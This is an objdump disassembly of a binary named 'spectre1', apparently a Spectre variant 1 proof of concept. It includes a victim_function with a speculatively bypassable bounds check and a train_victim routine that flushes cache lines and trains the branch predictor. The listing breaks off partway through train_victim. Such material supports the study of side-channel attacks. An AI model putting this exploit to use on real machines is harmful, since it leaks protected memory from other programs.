
spectre1:     file format elf64-x86-64


Disassembly of section .interp:

0000000000000238 <.interp>:
 238:	2f                   	(bad)  
 239:	6c                   	insb   (%dx),%es:(%rdi)
 23a:	69 62 36 34 2f 6c 64 	imul   $0x646c2f34,0x36(%rdx),%esp
 241:	2d 6c 69 6e 75       	sub    $0x756e696c,%eax
 246:	78 2d                	js     275 <_init-0x2eb>
 248:	78 38                	js     282 <_init-0x2de>
 24a:	36 2d 36 34 2e 73    	ss sub $0x732e3436,%eax
 250:	6f                   	outsl  %ds:(%rsi),(%dx)
 251:	2e 32 00             	xor    %cs:(%rax),%al

Disassembly of section .note.ABI-tag:

0000000000000254 <.note.ABI-tag>:
 254:	04 00                	add    $0x0,%al
 256:	00 00                	add    %al,(%rax)
 258:	10 00                	adc    %al,(%rax)
 25a:	00 00                	add    %al,(%rax)
 25c:	01 00                	add    %eax,(%rax)
 25e:	00 00                	add    %al,(%rax)
 260:	47                   	rex.RXB
 261:	4e 55                	rex.WRX push %rbp
 263:	00 00                	add    %al,(%rax)
 265:	00 00                	add    %al,(%rax)
 267:	00 03                	add    %al,(%rbx)
 269:	00 00                	add    %al,(%rax)
 26b:	00 02                	add    %al,(%rdx)
 26d:	00 00                	add    %al,(%rax)
 26f:	00 00                	add    %al,(%rax)
 271:	00 00                	add    %al,(%rax)
	...

Disassembly of section .note.gnu.build-id:

0000000000000274 <.note.gnu.build-id>:
 274:	04 00                	add    $0x0,%al
 276:	00 00                	add    %al,(%rax)
 278:	14 00                	adc    $0x0,%al
 27a:	00 00                	add    %al,(%rax)
 27c:	03 00                	add    (%rax),%eax
 27e:	00 00                	add    %al,(%rax)
 280:	47                   	rex.RXB
 281:	4e 55                	rex.WRX push %rbp
 283:	00 4f 41             	add    %cl,0x41(%rdi)
 286:	e1 10                	loope  298 <_init-0x2c8>
 288:	49 79 0c             	rex.WB jns 297 <_init-0x2c9>
 28b:	27                   	(bad)  
 28c:	09 55 55             	or     %edx,0x55(%rbp)
 28f:	ed                   	in     (%dx),%eax
 290:	b5 cc                	mov    $0xcc,%ch
 292:	7a 49                	jp     2dd <_init-0x283>
 294:	86 f0                	xchg   %dh,%al
 296:	4f                   	rex.WRXB
 297:	e6                   	.byte 0xe6

Disassembly of section .gnu.hash:

0000000000000298 <.gnu.hash>:
 298:	01 00                	add    %eax,(%rax)
 29a:	00 00                	add    %al,(%rax)
 29c:	01 00                	add    %eax,(%rax)
 29e:	00 00                	add    %al,(%rax)
 2a0:	01 00                	add    %eax,(%rax)
	...

Disassembly of section .dynsym:

00000000000002b8 <.dynsym>:
	...
 2d0:	3a 00                	cmp    (%rax),%al
 2d2:	00 00                	add    %al,(%rax)
 2d4:	12 00                	adc    (%rax),%al
	...
 2e6:	00 00                	add    %al,(%rax)
 2e8:	4b 00 00             	rex.WXB add %al,(%r8)
 2eb:	00 20                	add    %ah,(%rax)
	...
 2fd:	00 00                	add    %al,(%rax)
 2ff:	00 0b                	add    %cl,(%rbx)
 301:	00 00                	add    %al,(%rax)
 303:	00 12                	add    %dl,(%rdx)
	...
 315:	00 00                	add    %al,(%rax)
 317:	00 28                	add    %ch,(%rax)
 319:	00 00                	add    %al,(%rax)
 31b:	00 12                	add    %dl,(%rdx)
	...
 32d:	00 00                	add    %al,(%rax)
 32f:	00 67 00             	add    %ah,0x0(%rdi)
 332:	00 00                	add    %al,(%rax)
 334:	20 00                	and    %al,(%rax)
	...
 346:	00 00                	add    %al,(%rax)
 348:	12 00                	adc    (%rax),%al
 34a:	00 00                	add    %al,(%rax)
 34c:	12 00                	adc    (%rax),%al
	...
 35e:	00 00                	add    %al,(%rax)
 360:	76 00                	jbe    362 <_init-0x1fe>
 362:	00 00                	add    %al,(%rax)
 364:	20 00                	and    %al,(%rax)
	...
 376:	00 00                	add    %al,(%rax)
 378:	19 00                	sbb    %eax,(%rax)
 37a:	00 00                	add    %al,(%rax)
 37c:	22 00                	and    (%rax),%al
	...

Disassembly of section .dynstr:

0000000000000390 <.dynstr>:
 390:	00 6c 69 62          	add    %ch,0x62(%rcx,%rbp,2)
 394:	63 2e                	movslq (%rsi),%ebp
 396:	73 6f                	jae    407 <_init-0x159>
 398:	2e 36 00 70 72       	cs add %dh,%ss:0x72(%rax)
 39d:	69 6e 74 66 00 6d 61 	imul   $0x616d0066,0x74(%rsi),%ebp
 3a4:	6c                   	insb   (%dx),%es:(%rdi)
 3a5:	6c                   	insb   (%dx),%es:(%rdi)
 3a6:	6f                   	outsl  %ds:(%rsi),(%dx)
 3a7:	63 00                	movslq (%rax),%eax
 3a9:	5f                   	pop    %rdi
 3aa:	5f                   	pop    %rdi
 3ab:	63 78 61             	movslq 0x61(%rax),%edi
 3ae:	5f                   	pop    %rdi
 3af:	66 69 6e 61 6c 69    	imul   $0x696c,0x61(%rsi),%bp
 3b5:	7a 65                	jp     41c <_init-0x144>
 3b7:	00 5f 5f             	add    %bl,0x5f(%rdi)
 3ba:	6c                   	insb   (%dx),%es:(%rdi)
 3bb:	69 62 63 5f 73 74 61 	imul   $0x6174735f,0x63(%rdx),%esp
 3c2:	72 74                	jb     438 <_init-0x128>
 3c4:	5f                   	pop    %rdi
 3c5:	6d                   	insl   (%dx),%es:(%rdi)
 3c6:	61                   	(bad)  
 3c7:	69 6e 00 66 72 65 65 	imul   $0x65657266,0x0(%rsi),%ebp
 3ce:	00 47 4c             	add    %al,0x4c(%rdi)
 3d1:	49                   	rex.WB
 3d2:	42                   	rex.X
 3d3:	43 5f                	rex.XB pop %r15
 3d5:	32 2e                	xor    (%rsi),%ch
 3d7:	32 2e                	xor    (%rsi),%ch
 3d9:	35 00 5f 49 54       	xor    $0x54495f00,%eax
 3de:	4d 5f                	rex.WRB pop %r15
 3e0:	64 65 72 65          	fs gs jb 449 <_init-0x117>
 3e4:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 3eb:	4d 
 3ec:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 3ee:	6f                   	outsl  %ds:(%rsi),(%dx)
 3ef:	6e                   	outsb  %ds:(%rsi),(%dx)
 3f0:	65 54                	gs push %rsp
 3f2:	61                   	(bad)  
 3f3:	62                   	(bad)  
 3f4:	6c                   	insb   (%dx),%es:(%rdi)
 3f5:	65 00 5f 5f          	add    %bl,%gs:0x5f(%rdi)
 3f9:	67 6d                	insl   (%dx),%es:(%edi)
 3fb:	6f                   	outsl  %ds:(%rsi),(%dx)
 3fc:	6e                   	outsb  %ds:(%rsi),(%dx)
 3fd:	5f                   	pop    %rdi
 3fe:	73 74                	jae    474 <_init-0xec>
 400:	61                   	(bad)  
 401:	72 74                	jb     477 <_init-0xe9>
 403:	5f                   	pop    %rdi
 404:	5f                   	pop    %rdi
 405:	00 5f 49             	add    %bl,0x49(%rdi)
 408:	54                   	push   %rsp
 409:	4d 5f                	rex.WRB pop %r15
 40b:	72 65                	jb     472 <_init-0xee>
 40d:	67 69 73 74 65 72 54 	imul   $0x4d547265,0x74(%ebx),%esi
 414:	4d 
 415:	43 6c                	rex.XB insb (%dx),%es:(%rdi)
 417:	6f                   	outsl  %ds:(%rsi),(%dx)
 418:	6e                   	outsb  %ds:(%rsi),(%dx)
 419:	65 54                	gs push %rsp
 41b:	61                   	(bad)  
 41c:	62                   	.byte 0x62
 41d:	6c                   	insb   (%dx),%es:(%rdi)
 41e:	65                   	gs
	...

Disassembly of section .gnu.version:

0000000000000420 <.gnu.version>:
 420:	00 00                	add    %al,(%rax)
 422:	02 00                	add    (%rax),%al
 424:	00 00                	add    %al,(%rax)
 426:	02 00                	add    (%rax),%al
 428:	02 00                	add    (%rax),%al
 42a:	00 00                	add    %al,(%rax)
 42c:	02 00                	add    (%rax),%al
 42e:	00 00                	add    %al,(%rax)
 430:	02 00                	add    (%rax),%al

Disassembly of section .gnu.version_r:

0000000000000438 <.gnu.version_r>:
 438:	01 00                	add    %eax,(%rax)
 43a:	01 00                	add    %eax,(%rax)
 43c:	01 00                	add    %eax,(%rax)
 43e:	00 00                	add    %al,(%rax)
 440:	10 00                	adc    %al,(%rax)
 442:	00 00                	add    %al,(%rax)
 444:	00 00                	add    %al,(%rax)
 446:	00 00                	add    %al,(%rax)
 448:	75 1a                	jne    464 <_init-0xfc>
 44a:	69 09 00 00 02 00    	imul   $0x20000,(%rcx),%ecx
 450:	3f                   	(bad)  
 451:	00 00                	add    %al,(%rax)
 453:	00 00                	add    %al,(%rax)
 455:	00 00                	add    %al,(%rax)
	...

Disassembly of section .rela.dyn:

0000000000000458 <.rela.dyn>:
 458:	a8 1d                	test   $0x1d,%al
 45a:	20 00                	and    %al,(%rax)
 45c:	00 00                	add    %al,(%rax)
 45e:	00 00                	add    %al,(%rax)
 460:	08 00                	or     %al,(%rax)
 462:	00 00                	add    %al,(%rax)
 464:	00 00                	add    %al,(%rax)
 466:	00 00                	add    %al,(%rax)
 468:	d0 06                	rolb   (%rsi)
 46a:	00 00                	add    %al,(%rax)
 46c:	00 00                	add    %al,(%rax)
 46e:	00 00                	add    %al,(%rax)
 470:	b0 1d                	mov    $0x1d,%al
 472:	20 00                	and    %al,(%rax)
 474:	00 00                	add    %al,(%rax)
 476:	00 00                	add    %al,(%rax)
 478:	08 00                	or     %al,(%rax)
 47a:	00 00                	add    %al,(%rax)
 47c:	00 00                	add    %al,(%rax)
 47e:	00 00                	add    %al,(%rax)
 480:	90                   	nop
 481:	06                   	(bad)  
 482:	00 00                	add    %al,(%rax)
 484:	00 00                	add    %al,(%rax)
 486:	00 00                	add    %al,(%rax)
 488:	08 20                	or     %ah,(%rax)
 48a:	20 00                	and    %al,(%rax)
 48c:	00 00                	add    %al,(%rax)
 48e:	00 00                	add    %al,(%rax)
 490:	08 00                	or     %al,(%rax)
 492:	00 00                	add    %al,(%rax)
 494:	00 00                	add    %al,(%rax)
 496:	00 00                	add    %al,(%rax)
 498:	08 20                	or     %ah,(%rax)
 49a:	20 00                	and    %al,(%rax)
 49c:	00 00                	add    %al,(%rax)
 49e:	00 00                	add    %al,(%rax)
 4a0:	d8 1f                	fcomps (%rdi)
 4a2:	20 00                	and    %al,(%rax)
 4a4:	00 00                	add    %al,(%rax)
 4a6:	00 00                	add    %al,(%rax)
 4a8:	06                   	(bad)  
 4a9:	00 00                	add    %al,(%rax)
 4ab:	00 02                	add    %al,(%rdx)
	...
 4b5:	00 00                	add    %al,(%rax)
 4b7:	00 e0                	add    %ah,%al
 4b9:	1f                   	(bad)  
 4ba:	20 00                	and    %al,(%rax)
 4bc:	00 00                	add    %al,(%rax)
 4be:	00 00                	add    %al,(%rax)
 4c0:	06                   	(bad)  
 4c1:	00 00                	add    %al,(%rax)
 4c3:	00 04 00             	add    %al,(%rax,%rax,1)
	...
 4ce:	00 00                	add    %al,(%rax)
 4d0:	e8 1f 20 00 00       	callq  24f4 <__FRAME_END__+0x1728>
 4d5:	00 00                	add    %al,(%rax)
 4d7:	00 06                	add    %al,(%rsi)
 4d9:	00 00                	add    %al,(%rax)
 4db:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 4e1 <_init-0x7f>
 4e1:	00 00                	add    %al,(%rax)
 4e3:	00 00                	add    %al,(%rax)
 4e5:	00 00                	add    %al,(%rax)
 4e7:	00 f0                	add    %dh,%al
 4e9:	1f                   	(bad)  
 4ea:	20 00                	and    %al,(%rax)
 4ec:	00 00                	add    %al,(%rax)
 4ee:	00 00                	add    %al,(%rax)
 4f0:	06                   	(bad)  
 4f1:	00 00                	add    %al,(%rax)
 4f3:	00 07                	add    %al,(%rdi)
	...
 4fd:	00 00                	add    %al,(%rax)
 4ff:	00 f8                	add    %bh,%al
 501:	1f                   	(bad)  
 502:	20 00                	and    %al,(%rax)
 504:	00 00                	add    %al,(%rax)
 506:	00 00                	add    %al,(%rax)
 508:	06                   	(bad)  
 509:	00 00                	add    %al,(%rax)
 50b:	00 08                	add    %cl,(%rax)
	...

Disassembly of section .rela.plt:

0000000000000518 <.rela.plt>:
 518:	c0 1f 20             	rcrb   $0x20,(%rdi)
 51b:	00 00                	add    %al,(%rax)
 51d:	00 00                	add    %al,(%rax)
 51f:	00 07                	add    %al,(%rdi)
 521:	00 00                	add    %al,(%rax)
 523:	00 01                	add    %al,(%rcx)
	...
 52d:	00 00                	add    %al,(%rax)
 52f:	00 c8                	add    %cl,%al
 531:	1f                   	(bad)  
 532:	20 00                	and    %al,(%rax)
 534:	00 00                	add    %al,(%rax)
 536:	00 00                	add    %al,(%rax)
 538:	07                   	(bad)  
 539:	00 00                	add    %al,(%rax)
 53b:	00 03                	add    %al,(%rbx)
	...
 545:	00 00                	add    %al,(%rax)
 547:	00 d0                	add    %dl,%al
 549:	1f                   	(bad)  
 54a:	20 00                	and    %al,(%rax)
 54c:	00 00                	add    %al,(%rax)
 54e:	00 00                	add    %al,(%rax)
 550:	07                   	(bad)  
 551:	00 00                	add    %al,(%rax)
 553:	00 06                	add    %al,(%rsi)
	...

Disassembly of section .init:

0000000000000560 <_init>:
 560:	48 83 ec 08          	sub    $0x8,%rsp
 564:	48 8b 05 7d 1a 20 00 	mov    0x201a7d(%rip),%rax        # 201fe8 <__gmon_start__>
 56b:	48 85 c0             	test   %rax,%rax
 56e:	74 02                	je     572 <_init+0x12>
 570:	ff d0                	callq  *%rax
 572:	48 83 c4 08          	add    $0x8,%rsp
 576:	c3                   	retq   

Disassembly of section .plt:

0000000000000580 <.plt>:
 580:	ff 35 2a 1a 20 00    	pushq  0x201a2a(%rip)        # 201fb0 <_GLOBAL_OFFSET_TABLE_+0x8>
 586:	ff 25 2c 1a 20 00    	jmpq   *0x201a2c(%rip)        # 201fb8 <_GLOBAL_OFFSET_TABLE_+0x10>
 58c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000000590 <free@plt>:
 590:	ff 25 2a 1a 20 00    	jmpq   *0x201a2a(%rip)        # 201fc0 <free@GLIBC_2.2.5>
 596:	68 00 00 00 00       	pushq  $0x0
 59b:	e9 e0 ff ff ff       	jmpq   580 <.plt>

00000000000005a0 <printf@plt>:
 5a0:	ff 25 22 1a 20 00    	jmpq   *0x201a22(%rip)        # 201fc8 <printf@GLIBC_2.2.5>
 5a6:	68 01 00 00 00       	pushq  $0x1
 5ab:	e9 d0 ff ff ff       	jmpq   580 <.plt>

00000000000005b0 <malloc@plt>:
 5b0:	ff 25 1a 1a 20 00    	jmpq   *0x201a1a(%rip)        # 201fd0 <malloc@GLIBC_2.2.5>
 5b6:	68 02 00 00 00       	pushq  $0x2
 5bb:	e9 c0 ff ff ff       	jmpq   580 <.plt>

Disassembly of section .plt.got:

00000000000005c0 <__cxa_finalize@plt>:
 5c0:	ff 25 32 1a 20 00    	jmpq   *0x201a32(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 5c6:	66 90                	xchg   %ax,%ax

Disassembly of section .text:

00000000000005d0 <_start>:
 5d0:	31 ed                	xor    %ebp,%ebp
 5d2:	49 89 d1             	mov    %rdx,%r9
 5d5:	5e                   	pop    %rsi
 5d6:	48 89 e2             	mov    %rsp,%rdx
 5d9:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
 5dd:	50                   	push   %rax
 5de:	54                   	push   %rsp
 5df:	4c 8d 05 ea 05 00 00 	lea    0x5ea(%rip),%r8        # bd0 <__libc_csu_fini>
 5e6:	48 8d 0d 73 05 00 00 	lea    0x573(%rip),%rcx        # b60 <__libc_csu_init>
 5ed:	48 8d 3d 54 03 00 00 	lea    0x354(%rip),%rdi        # 948 <main>
 5f4:	ff 15 e6 19 20 00    	callq  *0x2019e6(%rip)        # 201fe0 <__libc_start_main@GLIBC_2.2.5>
 5fa:	f4                   	hlt    
 5fb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000000000600 <deregister_tm_clones>:
 600:	48 8d 3d 09 1b 20 00 	lea    0x201b09(%rip),%rdi        # 202110 <__TMC_END__>
 607:	55                   	push   %rbp
 608:	48 8d 05 01 1b 20 00 	lea    0x201b01(%rip),%rax        # 202110 <__TMC_END__>
 60f:	48 39 f8             	cmp    %rdi,%rax
 612:	48 89 e5             	mov    %rsp,%rbp
 615:	74 19                	je     630 <deregister_tm_clones+0x30>
 617:	48 8b 05 ba 19 20 00 	mov    0x2019ba(%rip),%rax        # 201fd8 <_ITM_deregisterTMCloneTable>
 61e:	48 85 c0             	test   %rax,%rax
 621:	74 0d                	je     630 <deregister_tm_clones+0x30>
 623:	5d                   	pop    %rbp
 624:	ff e0                	jmpq   *%rax
 626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 62d:	00 00 00 
 630:	5d                   	pop    %rbp
 631:	c3                   	retq   
 632:	0f 1f 40 00          	nopl   0x0(%rax)
 636:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 63d:	00 00 00 

0000000000000640 <register_tm_clones>:
 640:	48 8d 3d c9 1a 20 00 	lea    0x201ac9(%rip),%rdi        # 202110 <__TMC_END__>
 647:	48 8d 35 c2 1a 20 00 	lea    0x201ac2(%rip),%rsi        # 202110 <__TMC_END__>
 64e:	55                   	push   %rbp
 64f:	48 29 fe             	sub    %rdi,%rsi
 652:	48 89 e5             	mov    %rsp,%rbp
 655:	48 c1 fe 03          	sar    $0x3,%rsi
 659:	48 89 f0             	mov    %rsi,%rax
 65c:	48 c1 e8 3f          	shr    $0x3f,%rax
 660:	48 01 c6             	add    %rax,%rsi
 663:	48 d1 fe             	sar    %rsi
 666:	74 18                	je     680 <register_tm_clones+0x40>
 668:	48 8b 05 81 19 20 00 	mov    0x201981(%rip),%rax        # 201ff0 <_ITM_registerTMCloneTable>
 66f:	48 85 c0             	test   %rax,%rax
 672:	74 0c                	je     680 <register_tm_clones+0x40>
 674:	5d                   	pop    %rbp
 675:	ff e0                	jmpq   *%rax
 677:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
 67e:	00 00 
 680:	5d                   	pop    %rbp
 681:	c3                   	retq   
 682:	0f 1f 40 00          	nopl   0x0(%rax)
 686:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
 68d:	00 00 00 

0000000000000690 <__do_global_dtors_aux>:
 690:	80 3d 89 1a 20 00 00 	cmpb   $0x0,0x201a89(%rip)        # 202120 <completed.7697>
 697:	75 2f                	jne    6c8 <__do_global_dtors_aux+0x38>
 699:	48 83 3d 57 19 20 00 	cmpq   $0x0,0x201957(%rip)        # 201ff8 <__cxa_finalize@GLIBC_2.2.5>
 6a0:	00 
 6a1:	55                   	push   %rbp
 6a2:	48 89 e5             	mov    %rsp,%rbp
 6a5:	74 0c                	je     6b3 <__do_global_dtors_aux+0x23>
 6a7:	48 8b 3d 5a 19 20 00 	mov    0x20195a(%rip),%rdi        # 202008 <__dso_handle>
 6ae:	e8 0d ff ff ff       	callq  5c0 <__cxa_finalize@plt>
 6b3:	e8 48 ff ff ff       	callq  600 <deregister_tm_clones>
 6b8:	c6 05 61 1a 20 00 01 	movb   $0x1,0x201a61(%rip)        # 202120 <completed.7697>
 6bf:	5d                   	pop    %rbp
 6c0:	c3                   	retq   
 6c1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
 6c8:	f3 c3                	repz retq 
 6ca:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000000006d0 <frame_dummy>:
 6d0:	55                   	push   %rbp
 6d1:	48 89 e5             	mov    %rsp,%rbp
 6d4:	5d                   	pop    %rbp
 6d5:	e9 66 ff ff ff       	jmpq   640 <register_tm_clones>

00000000000006da <victim_function>:
 6da:	55                   	push   %rbp
 6db:	48 89 e5             	mov    %rsp,%rbp
 6de:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
 6e2:	0f b6 05 57 2c 30 00 	movzbl 0x302c57(%rip),%eax        # 303340 <bigNumberBuffer+0x1000>
 6e9:	0f b6 d0             	movzbl %al,%edx
 6ec:	0f b6 05 4d 2c 3e 00 	movzbl 0x3e2c4d(%rip),%eax        # 3e3340 <bigNumberBuffer+0xe1000>
 6f3:	0f b6 c0             	movzbl %al,%eax
 6f6:	01 c2                	add    %eax,%edx
 6f8:	0f b6 05 41 8c 30 00 	movzbl 0x308c41(%rip),%eax        # 309340 <bigNumberBuffer+0x7000>
 6ff:	0f b6 c0             	movzbl %al,%eax
 702:	01 c2                	add    %eax,%edx
 704:	0f b6 05 35 dc 30 00 	movzbl 0x30dc35(%rip),%eax        # 30e340 <bigNumberBuffer+0xc000>
 70b:	0f b6 c0             	movzbl %al,%eax
 70e:	01 d0                	add    %edx,%eax
 710:	48 98                	cltq   
 712:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 716:	73 60                	jae    778 <victim_function+0x9e>
 718:	0f b6 05 21 5c 31 00 	movzbl 0x315c21(%rip),%eax        # 316340 <bigNumberBuffer+0x14000>
 71f:	0f b6 d0             	movzbl %al,%edx
 722:	0f b6 05 17 fc 3b 00 	movzbl 0x3bfc17(%rip),%eax        # 3c0340 <bigNumberBuffer+0xbe000>
 729:	0f b6 c0             	movzbl %al,%eax
 72c:	01 d0                	add    %edx,%eax
 72e:	48 98                	cltq   
 730:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 734:	73 42                	jae    778 <victim_function+0x9e>
 736:	8b 05 e4 18 20 00    	mov    0x2018e4(%rip),%eax        # 202020 <bufferSize>
 73c:	48 98                	cltq   
 73e:	48 39 45 f8          	cmp    %rax,-0x8(%rbp)
 742:	73 34                	jae    778 <victim_function+0x9e>
 744:	48 8d 15 f5 18 20 00 	lea    0x2018f5(%rip),%rdx        # 202040 <buffer>
 74b:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 74f:	48 01 d0             	add    %rdx,%rax
 752:	0f b6 00             	movzbl (%rax),%eax
 755:	0f b6 c0             	movzbl %al,%eax
 758:	c1 e0 0c             	shl    $0xc,%eax
 75b:	48 63 d0             	movslq %eax,%rdx
 75e:	48 8d 05 db 19 20 00 	lea    0x2019db(%rip),%rax        # 202140 <array>
 765:	0f b6 14 02          	movzbl (%rdx,%rax,1),%edx
 769:	0f b6 05 b1 19 20 00 	movzbl 0x2019b1(%rip),%eax        # 202121 <temp>
 770:	21 d0                	and    %edx,%eax
 772:	88 05 a9 19 20 00    	mov    %al,0x2019a9(%rip)        # 202121 <temp>
 778:	90                   	nop
 779:	5d                   	pop    %rbp
 77a:	c3                   	retq   

000000000000077b <find_highest_score>:
 77b:	55                   	push   %rbp
 77c:	48 89 e5             	mov    %rsp,%rbp
 77f:	48 83 ec 20          	sub    $0x20,%rsp
 783:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
 787:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%rbp)
 78e:	c7 45 f8 00 00 00 00 	movl   $0x0,-0x8(%rbp)
 795:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%rbp)
 79c:	eb 3e                	jmp    7dc <find_highest_score+0x61>
 79e:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7a1:	48 98                	cltq   
 7a3:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7aa:	00 
 7ab:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 7af:	48 01 d0             	add    %rdx,%rax
 7b2:	8b 00                	mov    (%rax),%eax
 7b4:	39 45 f4             	cmp    %eax,-0xc(%rbp)
 7b7:	7d 1f                	jge    7d8 <find_highest_score+0x5d>
 7b9:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7bc:	89 45 f8             	mov    %eax,-0x8(%rbp)
 7bf:	8b 45 fc             	mov    -0x4(%rbp),%eax
 7c2:	48 98                	cltq   
 7c4:	48 8d 14 85 00 00 00 	lea    0x0(,%rax,4),%rdx
 7cb:	00 
 7cc:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
 7d0:	48 01 d0             	add    %rdx,%rax
 7d3:	8b 00                	mov    (%rax),%eax
 7d5:	89 45 f4             	mov    %eax,-0xc(%rbp)
 7d8:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
 7dc:	81 7d fc ff 00 00 00 	cmpl   $0xff,-0x4(%rbp)
 7e3:	7e b9                	jle    79e <find_highest_score+0x23>
 7e5:	8b 4d f4             	mov    -0xc(%rbp),%ecx
 7e8:	8b 55 f8             	mov    -0x8(%rbp),%edx
 7eb:	8b 45 f8             	mov    -0x8(%rbp),%eax
 7ee:	89 c6                	mov    %eax,%esi
 7f0:	48 8d 3d f1 03 00 00 	lea    0x3f1(%rip),%rdi        # be8 <_IO_stdin_used+0x8>
 7f7:	b8 00 00 00 00       	mov    $0x0,%eax
 7fc:	e8 9f fd ff ff       	callq  5a0 <printf@plt>
 801:	90                   	nop
 802:	c9                   	leaveq 
 803:	c3                   	retq   

0000000000000804 <train_victim>:
 804:	55                   	push   %rbp
 805:	48 89 e5             	mov    %rsp,%rbp
 808:	48 83 ec 30          	sub    $0x30,%rsp
 80c:	89 7d dc             	mov    %edi,-0x24(%rbp)
 80f:	48 89 75 d0          	mov    %rsi,-0x30(%rbp)
 813:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%rbp)
 81a:	eb 1a                	jmp    836 <train_victim+0x32>
 81c:	8b 45 e8             	mov    -0x18(%rbp),%eax
 81f:	c1 e0 0c             	shl    $0xc,%eax
 822:	48 63 d0             	movslq %eax,%rdx
 825:	48 8d 05 14 19 20 00 	lea    0x201914(%rip),%rax        # 202140 <array>
 82c:	48 01 d0             	add    %rdx,%rax
 82f:	0f ae 38             	clflush (%rax)
 832:	83 45 e8 01          	addl   $0x1,-0x18(%rbp)
 836:	81 7d e8 ff 00 00 00 	cmpl   $0xff,-0x18(%rbp)
 83d:	7e dd                	jle    81c <train_victim+0x18>
 83f:	0f ae f0             	mfence 
 842:	8b 0d d8 17 20 00    	mov    0x2017d8(%rip),%ecx        # 202020 <bufferSize>
 848:	8b 45 dc             	mov    -0x24(%rbp),%eax
 84b:	99                   	cltd   
 84c:	f7 f9                	idiv   %ecx
 84e:	89 d0                	mov    %edx,%eax
 850:	48 98                	cltq   
 852:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
 856:	c7 45 ec 1d 00 00 00 	movl   $0x1d,-0x14(%rbp)
 85d:	e9 d9 00 00 00       	jmpq   93b <train_victim+0x137>
 862:	48 8d 05 b7 17 20 00 	lea    0x2017b7(%rip),%rax        # 202020 <bufferSize>
 869:	0f ae 38             	clflush (%rax)
 86c:	c7 45 f0 00 00 00 00 	movl   $0x0,-0x10(%rbp)
 873:	eb 1a                	jmp    88f <train_victim+0x8b>
 875:	8b 45 f0             	mov    -0x10(%rbp),%eax
 878:	c1 e0 0c             	shl    $0xc,%eax
 87b:	48 63 d0             	movslq %eax,%rdx
 87e:	48 8d 05 bb 1a 30 00 	lea    0x301abb(%rip),%rax        # 302340 <bigNumberBuffer>
 885:	48 01 d0             	add    %rdx,%rax
 888:	0f ae 38             	clflush (%rax)
 88b:	83 45 f0 01          	addl   $0x1,-0x10(%rbp)
 88f:	81 7d f0 ff 00 00 00 	cmpl   $0xff,-0x10(%rbp)
 896:	7e dd                	jle    875 <train_victim+0x71>
 898:	0f ae f0             	mfence 
 89b:	c7 45 e4 00 00 00 00 	movl   $0x0,-0x1c(%rbp)
 8a2:	eb 09                	jmp    8ad <train_victim+0xa9>
 8a4:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 8a7:	83 c0 01             	add    $0x1,%eax
 8aa:	89 45 e4             	mov    %eax,-0x1c(%rbp)
 8ad:	8b 45 e4             	mov    -0x1c(%rbp),%eax
 8b0:	83 f8 63             	cmp    $0x63,%eax
 8b3:	7e ef                	jle    8a4 <train_victim+0xa0>
 8b5:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 8b8:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 8bd:	89 c8                	mov    %ecx,%eax
 8bf:	f7 ea                	imul   %edx
 8c1:	89 c8                	mov    %ecx,%eax
 8c3:	c1 f8 1f             	sar    $0x1f,%eax
 8c6:	29 c2                	sub    %eax,%edx
 8c8:	89 d0                	mov    %edx,%eax
 8ca:	01 c0                	add    %eax,%eax
 8cc:	01 d0                	add    %edx,%eax
 8ce:	01 c0                	add    %eax,%eax
 8d0:	29 c1                	sub    %eax,%ecx
 8d2:	89 ca                	mov    %ecx,%edx
 8d4:	8d 42 ff             	lea    -0x1(%rdx),%eax
 8d7:	66 b8 00 00          	mov    $0x0,%ax
 8db:	89 45 f4             	mov    %eax,-0xc(%rbp)
 8de:	8b 45 f4             	mov    -0xc(%rbp),%eax
 8e1:	c1 f8 10             	sar    $0x10,%eax
 8e4:	09 45 f4             	or     %eax,-0xc(%rbp)
 8e7:	48 8b 45 d0          	mov    -0x30(%rbp),%rax
 8eb:	89 c2                	mov    %eax,%edx
 8ed:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 8f1:	31 c2                	xor    %eax,%edx
 8f3:	8b 45 f4             	mov    -0xc(%rbp),%eax
 8f6:	21 c2                	and    %eax,%edx
 8f8:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
 8fc:	31 d0                	xor    %edx,%eax
 8fe:	89 45 f4             	mov    %eax,-0xc(%rbp)
 901:	8b 4d ec             	mov    -0x14(%rbp),%ecx
 904:	ba ab aa aa 2a       	mov    $0x2aaaaaab,%edx
 909:	89 c8                	mov    %ecx,%eax
 90b:	f7 ea                	imul   %edx
 90d:	89 c8                	mov    %ecx,%eax
 90f:	c1 f8 1f             	sar    $0x1f,%eax
 912:	29 c2                	sub    %eax,%edx
 914:	89 d0                	mov    %edx,%eax
 916:	01 c0                	add    %eax,%eax
 918:	01 d0                	add    %edx,%eax
 91a:	01 c0                	add    %eax,%eax
 91c:	29 c1                	sub    %eax,%ecx
